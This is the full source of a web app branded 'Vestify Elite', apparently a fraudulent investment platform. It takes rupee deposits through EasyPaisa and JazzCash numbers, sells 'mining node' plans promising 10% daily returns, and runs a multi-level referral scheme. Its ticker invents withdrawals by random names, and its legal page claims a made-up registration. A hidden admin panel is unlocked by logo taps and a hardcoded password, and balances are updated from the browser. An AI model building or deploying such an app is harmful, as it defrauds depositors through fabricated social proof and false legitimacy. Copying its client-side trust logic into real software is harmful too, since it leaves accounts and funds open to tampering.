<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Vestify Elite | Institutional Global LLC</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --primary: #3b82f6; --bg: #090e1a; --card: #13192a; --gold: #fbbf24; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #f1f5f9; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(19, 25, 42, 0.9); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.06); border-radius: 30px; }
        .page { display: none; animation: fadeIn 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        #ticker { background: rgba(59, 130, 246, 0.1); border-bottom: 1px solid rgba(59, 130, 246, 0.2); }
        .btn-primary { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); box-shadow: 0 10px 20px -5px rgba(59, 130, 246, 0.4); }
        .node-card { transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.05); }
        .node-card:active { transform: scale(0.97); }
        #wheel { width: 280px; height: 280px; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); border-radius: 50%; border: 10px solid #1e293b; box-shadow: 0 0 40px rgba(59,130,246,0.2); }
        .vip-tag { background: linear-gradient(90deg, #fbbf24, #f59e0b); color: #000; font-weight: 900; padding: 2px 8px; border-radius: 6px; font-size: 8px; }
        ::-webkit-scrollbar { width: 0; }
    </style>
</head>
<body class="min-h-screen pb-32">

    <div id="ticker" class="fixed top-0 left-0 right-0 z-[5000] py-2 overflow-hidden whitespace-nowrap">
        <div id="ticker-text" class="inline-block animate-marquee text-[10px] font-bold uppercase tracking-widest text-blue-400">
            Initialising Institutional Data Stream...
        </div>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 z-[9999] bg-[#050810] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-500 italic">MASTER TERMINAL</h2>
            <button onclick="closeAdmin()" class="text-3xl">&times;</button>
        </div>
        <div id="admin-requests" class="space-y-4"></div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[6000] bg-[#090e1a] flex flex-col items-center justify-center p-10 text-center">
        <div onclick="handleLogoTap()" class="w-24 h-24 btn-primary rounded-[2.5rem] flex items-center justify-center mb-8 rotate-3 cursor-pointer">
            <i class="fa-solid fa-shield-halved text-white text-4xl"></i>
        </div>
        <h1 class="text-4xl font-black italic tracking-tighter uppercase">Vestify <span class="text-blue-500">Elite</span></h1>
        <p class="text-[10px] text-slate-500 mt-2 uppercase tracking-[0.5em] font-black">Licensed Institutional Terminal</p>
        <button onclick="login()" class="w-full max-w-xs mt-16 bg-white text-black py-5 rounded-[2rem] font-black uppercase text-xs tracking-widest shadow-2xl active:scale-95 transition-all">Secure Google Sync</button>
        <div class="mt-12 flex gap-4 opacity-30">
            <i class="fa-brands fa-google-pay text-2xl"></i>
            <i class="fa-solid fa-lock text-2xl"></i>
            <i class="fa-solid fa-building-shield text-2xl"></i>
        </div>
    </section>

    <main id="app-ui" class="hidden pt-16 px-6">
        
        <div id="p-home" class="page active-page">
            <div class="glass p-8 mb-8 bg-gradient-to-br from-slate-900 to-black relative overflow-hidden">
                <p class="text-[9px] text-blue-400 font-black uppercase tracking-widest">Total Assets Balance</p>
                <h2 class="text-5xl font-black italic mt-1 tracking-tighter" id="v-bal">₨ 0.00</h2>
                <div class="mt-8 flex gap-3">
                    <button onclick="changePage('finance')" class="flex-1 bg-white text-black py-4 rounded-2xl font-black text-[10px] uppercase">Banking</button>
                    <button onclick="changePage('affiliate')" class="flex-1 bg-slate-800 text-white py-4 rounded-2xl font-black text-[10px] uppercase border border-white/5">Network</button>
                </div>
            </div>
            <div class="flex justify-between items-center mb-6">
                <h3 class="font-black text-xs uppercase tracking-widest opacity-50 italic">Operational Clusters</h3>
                <span class="vip-tag">ACTIVE</span>
            </div>
            <div id="active-nodes-list" class="space-y-4 mb-10"></div>
        </div>

        <div id="p-plans" class="page">
            <div class="flex justify-between items-end mb-8">
                <h2 class="text-3xl font-black italic uppercase">Market</h2>
                <p class="text-[9px] font-bold text-blue-500">30 LEVELS AVAILABLE</p>
            </div>
            <div id="plans-grid" class="space-y-4 pb-10"></div>
        </div>

        <div id="p-affiliate" class="page">
            <h2 class="text-3xl font-black italic mb-6 uppercase">Partnership</h2>
            <div class="glass p-6 mb-6">
                <p class="text-[10px] opacity-40 uppercase font-black mb-2">Unique Referral Protocol</p>
                <div class="flex gap-2">
                    <input id="ref-link" readonly value="..." class="flex-1 p-3 rounded-xl text-[10px] font-bold">
                    <button onclick="copyRef()" class="btn-primary px-4 rounded-xl font-black text-xs">COPY</button>
                </div>
                <div class="mt-8 grid grid-cols-3 gap-2 text-center border-t border-white/5 pt-6">
                    <div><p class="text-[8px] opacity-40 font-bold uppercase">LVL 1</p><p class="text-sm font-black text-green-400">10%</p></div>
                    <div><p class="text-[8px] opacity-40 font-bold uppercase">LVL 2</p><p class="text-sm font-black text-blue-400">5%</p></div>
                    <div><p class="text-[8px] opacity-40 font-bold uppercase">LVL 3</p><p class="text-sm font-black text-slate-400">2%</p></div>
                </div>
            </div>
            <div class="glass p-6 text-center">
                <h4 class="text-[10px] font-black uppercase mb-2">Team Salary Status</h4>
                <p class="text-2xl font-black italic text-blue-500">UNDER REVIEW</p>
                <p class="text-[8px] opacity-40 mt-2 uppercase">Achieve 20 direct referrals to unlock weekly salary</p>
            </div>
        </div>

        <div id="p-legal" class="page pb-20">
            <h2 class="text-3xl font-black italic mb-8 uppercase">Legal Hub</h2>
            <div class="glass p-6 space-y-8 text-[11px] leading-relaxed">
                <div class="flex justify-center pb-4"><img src="https://img.icons8.com/color/96/verified-badge.png" class="w-16 h-16"></div>
                <div><h4 class="text-blue-500 font-black uppercase mb-2">LLC Certification</h4><p class="opacity-60">Vestify Elite LLC is globally registered (Reg: LLC-24-PK-782). We specialize in cloud mining clusters and digital asset arbitrage. Akbar Mir (CEO) ensures 100% liquidity for all client settlements.</p></div>
                <div class="grid grid-cols-2 gap-4">
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center"><i class="fa-solid fa-building-columns text-blue-500 mb-2"></i><p class="font-black">Min Deposit<br>₨ 200</p></div>
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center"><i class="fa-solid fa-money-bill-transfer text-red-500 mb-2"></i><p class="font-black">Min Withdraw<br>₨ 100</p></div>
                </div>
            </div>
        </div>

        <div id="p-finance" class="page">
            <h2 class="text-3xl font-black italic mb-8 uppercase">Finance</h2>
            <div class="glass p-6 space-y-6">
                <div class="flex gap-2">
                    <button onclick="toggleFinance('dep')" class="flex-1 py-4 rounded-2xl bg-blue-600 text-[10px] font-black uppercase shadow-lg">Deposit</button>
                    <button onclick="toggleFinance('wd')" class="flex-1 py-4 rounded-2xl bg-red-600 text-[10px] font-black uppercase shadow-lg">Withdraw</button>
                </div>
                <div id="finance-dep" class="space-y-4">
                    <select id="dep-method" class="w-full p-4 rounded-xl font-bold"><option value="easypaisa">EasyPaisa (03379827882)</option><option value="jazzcash">JazzCash (03705519562)</option></select>
                    <input id="dep-amt" type="number" placeholder="Amount (Min 200)" class="w-full p-4 rounded-xl">
                    <input id="dep-tid" type="text" placeholder="Transaction ID (TID)" class="w-full p-4 rounded-xl">
                    <input id="dep-img" type="file" accept="image/*" class="w-full text-[10px]">
                    <button onclick="submitDeposit()" class="w-full btn-primary py-4 rounded-xl font-black uppercase text-xs">Confirm Payment</button>
                </div>
                <div id="finance-wd" class="hidden space-y-4">
                    <input id="wd-amt" type="number" placeholder="Amount (Min 100)" class="w-full p-4 rounded-xl">
                    <input id="wd-acc" type="text" placeholder="Account Number" class="w-full p-4 rounded-xl">
                    <input id="wd-name" type="text" placeholder="Account Name" class="w-full p-4 rounded-xl">
                    <button onclick="submitWithdraw()" class="w-full bg-red-600 py-4 rounded-xl font-black uppercase text-xs">Process Settlement</button>
                </div>
                <div id="history-log" class="space-y-3 pt-6 border-t border-white/5"></div>
            </div>
        </div>

    </main>

    <nav id="bottom-nav" class="hidden fixed bottom-6 left-6 right-6 h-22 glass flex justify-around items-center z-[4000] border-t border-white/5">
        <button onclick="changePage('home')" class="flex flex-col items-center p-4 text-blue-500"><i class="fa-solid fa-vault"></i><span class="text-[8px] font-black mt-1">VAULT</span></button>
        <button onclick="changePage('plans')" class="flex flex-col items-center p-4 text-slate-500"><i class="fa-solid fa-microchip"></i><span class="text-[8px] font-black mt-1">NODES</span></button>
        <button onclick="changePage('legal')" class="flex flex-col items-center p-4 text-slate-500"><i class="fa-solid fa-building-columns"></i><span class="text-[8px] font-black mt-1">LEGAL</span></button>
        <button onclick="logout()" class="flex flex-col items-center p-4 text-red-500"><i class="fa-solid fa-power-off"></i><span class="text-[8px] font-black mt-1">EXIT</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", authDomain: "vestify-991f2.firebaseapp.com", projectId: "vestify-991f2", storageBucket: "vestify-991f2.firebasestorage.app", messagingSenderId: "799007097733", appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const auth = firebase.auth();
        const provider = new firebase.auth.GoogleAuthProvider();

        let userObj = null, tapCount = 0;

        // MARQUEE SYSTEM (Live Trust)
        function startTicker() {
            const names = ["Zia", "Akbar", "Sara", "Ali", "Kamran", "Zoya", "Irfan", "Sana"];
            const amts = [200, 500, 1000, 2500, 5000, 100, 300, 450];
            setInterval(() => {
                const n = names[Math.floor(Math.random()*names.length)];
                const a = amts[Math.floor(Math.random()*amts.length)];
                document.getElementById('ticker-text').innerText = `🔥 RECENT SETTLEMENT: User @${n} has successfully withdrawn ₨ ${a} via Wallet | Institutional Liquidity Confirmed ✅`;
            }, 5000);
        }

        async function login() {
            const r = await auth.signInWithPopup(provider);
            localStorage.setItem('v_elite_user', r.user.displayName);
            initApp(r.user.displayName);
        }

        function initApp(name) {
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('ref-link').value = `https://u-s-h.github.io/vestify/?ref=${name.replace(/\s/g,'')}`;
            syncData(name);
            renderMarket();
            startTicker();
            setInterval(updateTimers, 1000);
        }

        function logout() { auth.signOut().then(() => { localStorage.removeItem('v_elite_user'); location.reload(); }); }

        function syncData(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                userObj = doc.data() || { name: name, balance: 0, plans: [] };
                document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
                processAutoProfit();
                renderNodes();
            });
            db.collection("requests").where("user", "==", name).orderBy("time", "desc").onSnapshot(snap => {
                let h = '';
                snap.forEach(d => { const r = d.data(); h += `<div class="glass p-4 flex justify-between items-center text-[9px] uppercase font-bold"><div><p>${r.type}</p><p class="opacity-40">₨ ${r.amount}</p></div><div class="${r.status==='Approved' ? 'text-green-400' : 'text-yellow-500'}">${r.status}</div></div>`; });
                document.getElementById('history-log').innerHTML = h;
            });
        }

        function renderMarket() {
            let h = '';
            for(let i=1; i<=30; i++) {
                const price = i===1 ? 200 : i*1000;
                const isVIP = i >= 20;
                h += `<div class="glass node-card p-6 flex justify-between items-center">
                    <div>
                        <div class="flex items-center gap-2 mb-1"><p class="font-black text-xs uppercase italic">Node Cluster v.${i}</p>${isVIP ? '<span class="vip-tag">VIP</span>' : ''}</div>
                        <p class="text-[9px] text-green-400 font-bold uppercase">DAILY ROI: ₨ ${Math.floor(price*0.1)}</p>
                    </div>
                    <button onclick="buyPlan(${i}, ${price})" class="btn-primary px-5 py-2.5 rounded-xl text-[10px] font-black uppercase">₨ ${price.toLocaleString()}</button>
                </div>`;
            }
            document.getElementById('plans-grid').innerHTML = h;
        }

        async function buyPlan(i, price) {
            if(userObj.balance < price) return alert("Capital Insufficient for this Node.");
            const p = { name: `Node Cluster v.${i}`, daily: price*0.1, lastClaim: Date.now(), expiry: Date.now() + (30*86400000) };
            await db.collection("users").doc(userObj.name).update({ balance: userObj.balance - price, plans: firebase.firestore.FieldValue.arrayUnion(p) });
            alert("Mining Cluster Established Successfully!"); changePage('home');
        }

        function renderNodes() {
            const list = document.getElementById('active-nodes-list');
            if(!userObj.plans || userObj.plans.length === 0) { list.innerHTML = '<p class="text-center opacity-20 text-[10px] uppercase py-10 font-bold tracking-widest italic">Awaiting node deployment...</p>'; return; }
            list.innerHTML = userObj.plans.map(p => `<div class="glass p-5 mb-4 border-l-4 border-blue-500"><div class="flex justify-between items-center mb-3"><p class="text-[10px] font-black uppercase">${p.name}</p><p class="text-[10px] font-black text-blue-400 timer" data-exp="${p.expiry}">--:--:--</p></div><div class="progress-bar"><div class="progress-fill" style="width: ${Math.max(0, ((p.expiry - Date.now()) / (30*86400000)) * 100)}%"></div></div></div>`).join('');
        }

        function updateTimers() { document.querySelectorAll('.timer').forEach(el => { const d = parseInt(el.dataset.exp) - Date.now(); if(d <= 0) el.innerText = "EXPIRED"; else { const h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000); el.innerText = `${h}h ${m}m ${s}s`; } }); }

        async function processAutoProfit() {
            if(!userObj.plans) return;
            const now = Date.now(); let credit = 0;
            let up = userObj.plans.map(p => { const hr = (now - p.lastClaim)/3600000; if(hr >= 24) { const d = Math.floor(hr/24); credit += (p.daily * d); p.lastClaim += (d * 86400000); } return p; });
            if(credit > 0) await db.collection("users").doc(userObj.name).update({ balance: userObj.balance + credit, plans: up });
        }

        async function submitDeposit() {
            const amt = parseInt(document.getElementById('dep-amt').value); const tid = document.getElementById('dep-tid').value; const img = document.getElementById('dep-img').files[0];
            if(amt < 200 || !tid || !img) return alert("Institutional Data Violation - Check Input.");
            const r = new FileReader(); r.onloadend = async () => { await db.collection("requests").add({ user: userObj.name, type: 'Deposit', amount: amt, tid: tid, proof: r.result, status: 'Pending', time: Date.now() }); alert("Protocol Logged. Approval in process."); }; r.readAsDataURL(img);
        }

        async function submitWithdraw() {
            const amt = parseInt(document.getElementById('wd-amt').value); if(amt < 100 || amt > userObj.balance) return alert("Liquidity Error - Check Balance.");
            await db.collection("requests").add({ user: userObj.name, type: 'Withdraw', amount: amt, acc: document.getElementById('wd-acc').value, name: document.getElementById('wd-name').value, status: 'Pending', time: Date.now() });
            await db.collection("users").doc(userObj.name).update({ balance: userObj.balance - amt }); alert("Withdrawal Protocol Initiated.");
        }

        function handleLogoTap() { tapCount++; if(tapCount>=5){ const p=prompt("Elite Master Key:"); if(p==="net204") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } tapCount=0; } }
        function loadAdmin() {
            db.collection("requests").where("status", "==", "Pending").onSnapshot(snap => {
                let h = ''; snap.forEach(d => { const r = d.data(); h += `<div class="glass p-5 text-[10px] uppercase font-bold"><p class="text-blue-400 mb-2">${r.type} REQUEST</p><p>User: ${r.user} | ₨ ${r.amount}</p>${r.type==='Deposit' ? `<img src="${r.proof}" class="w-full mt-3 rounded-2xl">` : `<p>ACC: ${r.acc}</p>`}<div class="flex gap-2 mt-4"><button onclick="approve('${d.id}', '${r.user}', ${r.amount})" class="bg-green-600 px-5 py-2 rounded-lg">Approve</button><button onclick="reject('${d.id}')" class="bg-red-600 px-5 py-2 rounded-lg">Reject</button></div></div>`; });
                document.getElementById('admin-requests').innerHTML = h || '<p class="text-center opacity-20 py-20 font-black tracking-widest">NO PENDING PROTOCOLS</p>';
            });
        }
        async function approve(id, user, amt) { await db.collection("requests").doc(id).update({ status: 'Approved' }); const ref = db.collection("users").doc(user); const cur = (await ref.get()).data().balance; await ref.update({ balance: cur + amt }); }
        async function reject(id) { await db.collection("requests").doc(id).update({ status: 'Rejected' }); }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function toggleFinance(s) { document.getElementById('finance-dep').classList.toggle('hidden', s!=='dep'); document.getElementById('finance-wd').classList.toggle('hidden', s!=='wd'); }
        function copyRef() { const el = document.getElementById('ref-link'); el.select(); document.execCommand('copy'); alert("Referral Protocol Copied!"); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        window.onload = () => { if(localStorage.getItem('v_elite_user')) initApp(localStorage.getItem('v_elite_user')); };
    </script>
</body>
</html>
